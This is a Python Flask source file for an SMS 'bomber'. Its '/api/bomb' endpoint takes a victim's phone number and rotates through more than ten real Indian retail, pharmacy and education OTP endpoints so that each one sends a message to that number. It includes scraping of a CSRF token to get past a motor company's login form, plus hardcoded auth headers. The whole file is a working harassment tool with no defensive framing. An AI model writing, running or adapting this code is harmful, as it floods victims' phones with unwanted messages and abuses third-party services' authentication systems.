from flask import Flask, request, jsonify
import requests
from bs4 import BeautifulSoup
import json

app = Flask(__name__)

def get_tvs_token():
    try:
        session = requests.Session()
        res = session.get("https://www.tvsmotor.com/account/login", timeout=5)
        soup = BeautifulSoup(res.text, 'html.parser')
        token = soup.find('input', {'name': '__RequestVerificationToken'})['value']
        return token, session.cookies.get_dict()
    except: return None, None

@app.route('/api/bomb')
def bomb():
    target = request.args.get('number')
    idx = int(request.args.get('index', 0))
    
    # --- आपकी सभी ताज़ा APIs ---
    apis = [
        {"name": "Flipkart_v6", "method": "POST", "url": "https://1.rome.api.flipkart.com/api/6/user/signup/status", "json": {"loginId": [f"+91{target}"], "supportAllStates": True}},
        {"name": "JioMart", "method": "POST", "url": "https://api.account.relianceretail.com/service/application/retail-auth/v2.0/send-otp", "json": {"mobile": target}},
        {"name": "PharmEasy", "method": "POST", "url": "https://pharmeasy.in/api/auth/requestOTP", "json": {"contactNumber": target}},
        {"name": "Tata_1mg", "method": "POST", "url": "https://www.1mg.com/pwa-api/auth/create_token", "json": {"number": target, "is_doctor": False, "referral_code": None}},
        {"name": "Netmeds", "method": "POST", "url": "https://www.netmeds.com/api/service/application/user/authentication/v1.0/login/otp?platform=65f562c1504a59a67f529ad4", "json": {"mobile": target, "country_code": "91"}},
        {"name": "SarinSkin", "method": "POST", "url": "https://edge.pickrr.com/aggregator/api/ve1/aggregator-service/user/login", "json": {"cred": target, "tenant_id": "66b5e590984e5c9744f9e56f", "cart_id": "69bfca89b135b6654d6c6a3a", "skip_existing_address_check": False}},
        {"name": "PlatinumRx", "method": "POST", "url": "https://backend.platinumrx.in/auth/sendOtp", "json": {"phone_number": target}},
        {"name": "Allen", "method": "POST", "url": "https://api.allen-live.in/api/v1/auth/sendOtp?center_id=&source=home-page-login", "json": {"country_code": "91", "phone_number": target, "persona_type": "STUDENT"}},
        {"name": "Apollo247", "method": "POST", "url": "https://apigateway.apollo247.in/auth-service/generateOtp", "json": {"loginType": "PATIENT", "mobileNumber": f"+91{target}"}, "headers": {"X-Apollo-Pre-Auth-Key": "eyJHbGciOiJIUzI1NiJ9.ZTVhM2I0YmEtY2E0NC00M2I0LTg0ZTUtZDU3M2M1YjRjZTU3.XyJ9", "platform": "web"}},
        {"name": "Mamaearth", "method": "POST", "url": "https://gkx.gokwik.co/kp/api/v1/auth/otp/send", "json": {"phone": target, "country": "in", "country_code": "+91"}, "headers": {"Gk-Merchant-Id": "12wyqc26spoknx0kv7t"}},
        {"name": "Housing", "method": "POST", "url": "https://login.housing.com/api/v2/send-otp", "json": {"phone": target}},
        {"name": "TVS_Motor", "method": "SPECIAL_TVS"}
    ]

    api = apis[idx % len(apis)]
    headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
    if "headers" in api: headers.update(api["headers"])

    try:
        if api["name"] == "TVS_Motor":
            token, cookies = get_tvs_token()
            if token:
                res = requests.post("https://www.tvsmotor.com/api/Ecommerce/GetAccountOtp", data={"MobileNumber": target, "Locale": "V", "__RequestVerificationToken": token}, cookies=cookies, timeout=5)
            else: return jsonify({"status": "failed", "name": "TVS Token Error"})
        elif api["method"] == "POST":
            res = requests.post(api["url"], json=api["json"], headers=headers, timeout=5)
        else:
            res = requests.get(api["url"], headers=headers, timeout=5)

        if res.status_code in [200, 201, 202]:
            return jsonify({"status": "success", "name": api["name"]})
    except: pass
    return jsonify({"status": "failed", "name": api["name"]})
